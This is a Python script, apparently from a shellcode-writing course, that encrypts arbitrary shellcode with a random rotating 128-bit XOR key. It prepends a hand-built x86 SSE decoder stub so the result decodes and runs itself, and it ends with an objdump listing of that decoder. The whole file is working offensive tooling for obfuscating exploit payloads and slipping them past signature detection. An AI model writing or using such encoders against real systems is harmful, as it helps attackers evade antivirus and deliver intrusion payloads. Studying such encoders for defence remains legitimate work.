#!/usr/bin/python3

import sys
import random
import struct
import os

# for this function we are operating on 128 bit integers
# We want to shift in multiples of bytes since the xmm instructions
# shift in multiples of bytes, not bits
def rotate128Left(value, bytes):
    mask=0xffffffffffffffffffffffffffffffff
    return (((value << (bytes*8)) & mask) | (value >> (128-(bytes*8))))

# Shellcode payload to encode
with os.fdopen(sys.stdin.fileno(), 'rb') as shellcode_input:
    mainPayload = shellcode_input.read()

# Get random key
xorKey = random.getrandbits(128)
# We need to shift an odd amount to avoid short cycles
shiftKey = random.randint(1,15)
if shiftKey % 2 == 0:
   shiftKey = shiftKey+1

# save for testing the reverse
initialXorKey = xorKey

#print("\nShift:")
shiftString = '\\x'+'{:02x}'.format(shiftKey)
#print(shiftString)
#print("\nShiftRemainder:")
remainderString = '\\x' + '{:02x}'.format(16-shiftKey)
#print(remainderString)

#print("\nInitial XOR Key:")
xorKeyString = ""
for s in xorKey.to_bytes(16,"little"):
    xorKeyString += "\\x" + '{:02x}'.format(s)
#print(xorKeyString)

# Test rotate128left function
# this should be two bytes to the left
#testvalue = rotate128Left(xorKey, shiftKey)
#print("Rotated XOR Key:")
#for s in testvalue.to_bytes(16,"little"):
#    print("\\x" + '{:02x}'.format(s), end='')
#print("")


# break up input into chunks of 16 bytes
#print("original input:")
payloadParts = []
while(mainPayload):
    nextPart = int.from_bytes(mainPayload[0:16], "little")
#    print(str(nextPart)+" ", end='')
    payloadParts.append(xorKey ^ nextPart)
    xorKey = rotate128Left(xorKey, shiftKey)
    #print("Rotated Key: ")
    #for s in xorKey.to_bytes(16,"little"):
    #    print("0x"+'{:02x}'.format(s)+' ', end='')
    mainPayload = mainPayload[16:]

#print("\nPayload parts:")
#print(payloadParts)

#xorKey = initialXorKey
#decodedPayload = ""
#for p in payloadParts:
#    nextPart = p ^ xorKey
#    xorKey = rotate128Left(xorKey, shiftKey)
#    for s in nextPart.to_bytes(16, "little"):
#        decodedPayload += "\\x" + '{:02x}'.format(s)
#
#print("DecodedPayload:\n"+decodedPayload)

encodedPayload = ""
for p in payloadParts:
    for s in p.to_bytes(16,"little"):
        encodedPayload += "\\x" + '{:02x}'.format(s)

#print("\n\nEncodedPayload:")
#print(encodedPayload)
    
#print("\nCurrently rotated XOR Key:")
currentKey=""
for s in xorKey.to_bytes(16,"little"):
    currentKey += "\\x" + '{:02x}'.format(s) 
#print(currentKey)


#print("Total encoded payload with key at the end:")
#print(encodedPayload+currentKey)

#So now we have all the important parts
#So lets construct the entire shellcode, including the decoder and the encoded shellcode
# I wanted to break up the lines so I did it by labeled section...
mainPayload="\\xeb\\x0d"  \
            +"\\x5e\\x31\\xc9\\xf3\\x0f\\x6f\\x0e\\x66\\x0f\\xef\\xdb\\xeb\\x15"\
            +"\\xe8\\xee\\xff\\xff\\xff"\
            +xorKeyString \
            +"\\xeb\\x2f"\
            +"\\x5e\\x89\\xf2"\
            +"\\xf3\\x0f\\x6f\\x06\\x66\\x0f\\xef\\xc1\\xf3\\x0f\\x7f\\x06\\xc4\\xe2\\x79\\x17\\xd8\\x73\\x02\\xff\\xe2"\
            +"\\xf3\\x0f\\x6f\\xd1\\x66\\x0f\\x73\\xf9"\
            + shiftString\
            +"\\x66\\x0f\\x73\\xda"\
            + remainderString\
            +"\\x66\\x0f\\xeb\\xca\\x83\\xc6\\x10\\xeb\\xd4"\
            +"\\xe8\\xcc\\xff\\xff\\xff"\
            +encodedPayload+currentKey


if "00" in mainPayload:
   print("It contains a null! Try again...")
   exit()

#print("Main Payload:")
print(mainPayload)


'''
The following is a dump of the xmm_xor_decoder asm
It contains placeholder values for the xorkey and encoded shellcode
This code was used to generate the above string
$ objdump -d xmm_xor_decoder

xmm_xor_decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 0d                	jmp    804806f <get_keys>

08048062 <got_keys>:
 8048062:	5e                   	pop    %esi
 8048063:	31 c9                	xor    %ecx,%ecx
 8048065:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
 8048069:	66 0f ef db          	pxor   %xmm3,%xmm3
 804806d:	eb 15                	jmp    8048084 <move_on>

0804806f <get_keys>:
 804806f:	e8 ee ff ff ff       	call   8048062 <got_keys>

08048074 <xorKey>:
 8048074:	71 6a                	jno    80480e0 <shellcode+0x26>
 8048076:	c9                   	leave  
 8048077:	fc                   	cld    
 8048078:	fe                   	(bad)  
 8048079:	1a d1                	sbb    %cl,%dl
 804807b:	09 b4 9c 2b 7f ce 75 	or     %esi,0x75ce7f2b(%esp,%ebx,4)
 8048082:	8f c4                	pop    %esp

08048084 <move_on>:
 8048084:	eb 2f                	jmp    80480b5 <get_shellcode>

08048086 <got_shellcode>:
 8048086:	5e                   	pop    %esi
 8048087:	89 f2                	mov    %esi,%edx

08048089 <decode_loop>:
 8048089:	f3 0f 6f 06          	movdqu (%esi),%xmm0
 804808d:	66 0f ef c1          	pxor   %xmm1,%xmm0
 8048091:	f3 0f 7f 06          	movdqu %xmm0,(%esi)
 8048095:	c4 e2 79 17 d8       	vptest %xmm0,%xmm3
 804809a:	73 02                	jae    804809e <rotate_key>
 804809c:	ff e2                	jmp    *%edx

0804809e <rotate_key>:
 804809e:	f3 0f 6f d1          	movdqu %xmm1,%xmm2
 80480a2:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
 80480a7:	66 0f 73 da 07       	psrldq $0x7,%xmm2
 80480ac:	66 0f eb ca          	por    %xmm2,%xmm1
 80480b0:	83 c6 10             	add    $0x10,%esi
 80480b3:	eb d4                	jmp    8048089 <decode_loop>

080480b5 <get_shellcode>:
 80480b5:	e8 cc ff ff ff       	call   8048086 <got_shellcode>

080480ba <shellcode>:
 80480ba:	40                   	inc    %eax
 80480bb:	a3 3e 1d cf c1       	mov    %eax,0xc1cf1d3e
 80480c0:	61                   	popa   
 80480c1:	0d 07 9d c0 74       	or     $0x74c09d07,%eax
 80480c6:	97                   	xchg   %eax,%edi
 80480c7:	c7 82 09 89 04 9d 1a 	movl   $0xf503a41a,-0x62fb76f7(%edx)
 80480ce:	a4 03 f5 
 80480d1:	67 34 8e             	addr16 xor $0x8e,%al
 80480d4:	95                   	xchg   %eax,%ebp
 80480d5:	36                   	ss
 80480d6:	b4 9b                	mov    $0x9b,%ah
 80480d8:	76 bd                	jbe    8048097 <decode_loop+0xe>
 80480da:	e0 e4                	loopne 80480c0 <shellcode+0x6>
 80480dc:	06                   	push   %es
 80480dd:	05 bb 90 9a 3b       	add    $0x3b9a90bb,%eax
 80480e2:	db 09                	fisttpl (%ecx)
 80480e4:	b4 9c                	mov    $0x9c,%ah
 80480e6:	2b 7f ce             	sub    -0x32(%edi),%edi
 80480e9:	75 1a                	jne    8048105 <shellcode+0x4b>
 80480eb:	d1 09                	rorl   (%ecx)
 80480ed:	b4 9c                	mov    $0x9c,%ah
 80480ef:	2b 7f ce             	sub    -0x32(%edi),%edi
 80480f2:	75 8f                	jne    8048083 <xorKey+0xf>
 80480f4:	c4 71 6a             	les    0x6a(%ecx),%esi
 80480f7:	c9                   	leave  
 80480f8:	fc                   	cld    
 80480f9:	fe                   	.byte 0xfe
'''
